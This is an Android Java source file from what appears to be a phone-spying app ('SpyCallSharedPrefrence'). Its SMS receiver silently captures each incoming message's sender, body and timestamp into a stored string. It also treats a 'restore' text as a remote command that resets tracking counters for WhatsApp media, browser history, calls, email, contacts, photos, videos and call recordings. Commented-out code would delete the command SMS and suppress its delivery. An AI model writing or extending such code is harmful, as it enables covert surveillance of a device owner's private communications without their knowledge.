/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
/**
 * @author jitendrav
 *
 */
package com.hinj.secure.smsgps;

import java.util.List;

import org.apache.http.NameValuePair;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.hinj.app.utils.SpyCallSharedPrefrence;

public class ResetAll_CountPre_Receiver extends BroadcastReceiver 
{

	public static final String SMS_EXTRA_NAME = "pdus";
	public static final String SMS_URI = "content://sms";
	
	public static final String ADDRESS = "address";
    public static final String PERSON = "person";
    public static final String DATE = "date";
    public static final String READ = "read";
    public static final String STATUS = "status";
    public static final String TYPE = "type";
    public static final String BODY = "body";
    public static final String SEEN = "seen";
    public static  final String IndexNumber ="IndexNumber";
    
    public static final int MESSAGE_TYPE_INBOX = 1;
    public static final int MESSAGE_TYPE_SENT = 2;
    
    public static final int MESSAGE_IS_NOT_READ = 0;
    public static final int MESSAGE_IS_READ = 1;
    
    public static final int MESSAGE_IS_NOT_SEEN = 0;
    public static final int MESSAGE_IS_SEEN = 1;
        // Change the password here or give a user possibility to change it
    public static final byte[] PASSWORD = new byte[]{ 0x20, 0x32, 0x34, 0x47, (byte) 0x84, 0x33, 0x58 };
    String address;
    String body;
    SQLiteDatabase db;
	//Cursor d;
	String strUserID,strUserMobileNo,strUserKey;
	List<NameValuePair> nameValuePairs;
	String responce,responceLastDate,responce1st;
	AlertDialog.Builder alertbox,alertbox1;
	String sent_inbox;
	static String getSMSDetail_SR1="",getSMSDetail_SR2="";
	int getStatus;
	
	public void onReceive( Context context, Intent intent ) 
	{
		/*****************************************/
		/* if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
	            Intent serviceIntent = new Intent("org.secure.sms.SecureMessagesActivity");
	            context.startService(serviceIntent);
	        }*/
		 /*****************************************/
		// Get SMS map from Intent
        Bundle extras = intent.getExtras();
        
        String messages = "";
        
        if ( extras != null )
        {
            // Get received SMS array
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );
            
            // Get ContentResolver object for pushing encrypted SMS to incoming folder
            ContentResolver contentResolver = context.getContentResolver();
	            
	            for ( int i = 0; i < smsExtra.length; ++i )
	            {
	            	SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);
	            	
	            	Log.i("smsreceiving time", sms.getTimestampMillis()+"");
	            	body = sms.getMessageBody().toString();
	            	address = sms.getOriginatingAddress();
	            		
	            	messages += "SMS from " + address + " :\n";                    
	            	messages += body + "\n";	            	
	            	
	            	String CheckSetSTR=body.toLowerCase();
	            	
	            	if(body.toLowerCase().equals("restore"))
	            	{	            		
	            		SpyCallSharedPrefrence.saveWhatsUp_PreCount(context,0);
	            		SpyCallSharedPrefrence.saveBROWSER_PreCount(context,0);
	            		SpyCallSharedPrefrence.saveCALL_PreCount(context,0);
	            		SpyCallSharedPrefrence.saveEMAIL_PreCount(context,0);	            		
	            		SpyCallSharedPrefrence.saveSMS_PreCount(context,0);
	            		SpyCallSharedPrefrence.saveWHATSAPP_IMAGE_COUNT(context,0);
	            		SpyCallSharedPrefrence.saveWHATSAPP_VOICE_COUNT(context,0);
	            		SpyCallSharedPrefrence.saveCONTACT_LISTCount(context, 0);
	            		SpyCallSharedPrefrence.saveIMAGES_PreCount(context, 0);
	            		SpyCallSharedPrefrence.saveVIDEO_PreCount(context, 0);
	            		SpyCallSharedPrefrence.saveCallRecordCount(context, 0);
	            		
	            		
	            		
	            		
	            		/*****************Delete Restore SMS Start**********************/
	            		
	            	    //context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + threadIdIn), null, null);
	            		 
	            		/*Uri deleteUri = Uri.parse("content://sms");
	            	    int count = 0;
	            	    final String[] projection = new String[] {"restore"};
	            	    
	            	    Cursor c = context.getContentResolver().query(deleteUri, null, sms.getMessageBody(),projection, null);
	            	    
	            	    c.getCount();
	            	    
	            	    while (c.moveToNext()) {
	            	        try {
	            	            // Delete the SMS
	            	            String pid = c.getString(0); // Get id;
	            	            String uri = "content://sms/" + pid;
	            	            count = context.getContentResolver().delete(Uri.parse(uri),null, null);
	            	        } catch (Exception e) {
	            	        }
	            	    }
	            	    */
	            		
	            		/*****************Delete Restore SMS End**********************/
	            		
	            		
	            	}
	            	
	            	// Here you can add any your code to work with incoming SMS
	            	// I added encrypting of all received SMS
	                // putSmsToDatabase( contentResolver, sms );
	            	try{
	            	
	            		long l=Long.parseLong(""+sms.getTimestampMillis());						
						l=l/1000;
						String a =""+l;	
						getStatus=sms.getStatus();
						
						if(getStatus==1)
						{						
							sent_inbox="Inbox";
						}
						 else if(getStatus==2)
						{					   
							 sent_inbox="Sent";
						}	
						 else
						 {
							 sent_inbox="Inbox";
						 }
						
						getSMSDetail_SR1=address+"|||"+body+"|||"+sent_inbox+"|||"+a;            		
	            		//Toast.makeText(context, "SMS  "+CallActivity.smsDetail, Toast.LENGTH_SHORT).show();            		
	            	}
	            	catch (Exception e) {
	            	}
	            	
	            }
	            
	            if(getSMSDetail_SR2.length()!=0)
				{
					getSMSDetail_SR2=getSMSDetail_SR1+"##KM##"+getSMSDetail_SR2;
				}
				else
				{
					getSMSDetail_SR2=getSMSDetail_SR1;
				}            
	            //Toast.makeText(context, "SMS  "+getSMSDetail_SR2, Toast.LENGTH_SHORT).show();
	  
           // Log.i("Print ****************",getSMSDetail_SR2);
          
            
        }        
        // WARNING!!! 
        // If you uncomment next line then received SMS will not be put to incoming.
        // Be careful!
        // this.abortBroadcast(); 
	}
	
	private void putSmsToDatabase( ContentResolver contentResolver, SmsMessage sms )
	{
		// Create SMS row
        ContentValues values = new ContentValues();
        values.put( ADDRESS, sms.getOriginatingAddress() );
        values.put( DATE, sms.getTimestampMillis());
        values.put( READ, MESSAGE_IS_NOT_READ );
        values.put( STATUS, sms.getStatus());
        values.put( TYPE, MESSAGE_TYPE_INBOX );
        values.put( SEEN, MESSAGE_IS_NOT_SEEN );
        values.put( BODY, sms.getMessageBody().toString() );
        
        
        try
        {
        	//String encryptedPassword = StringCryptor.encrypt( new String(PASSWORD), sms.getMessageBody().toString() ); 
        	//values.put( BODY, encryptedPassword );        	
        }
        catch ( Exception e ) 
        { 
        	e.printStackTrace(); 
    	}
        
        // Push row into the SMS table
        contentResolver.insert( Uri.parse( SMS_URI ), values );
	}
}
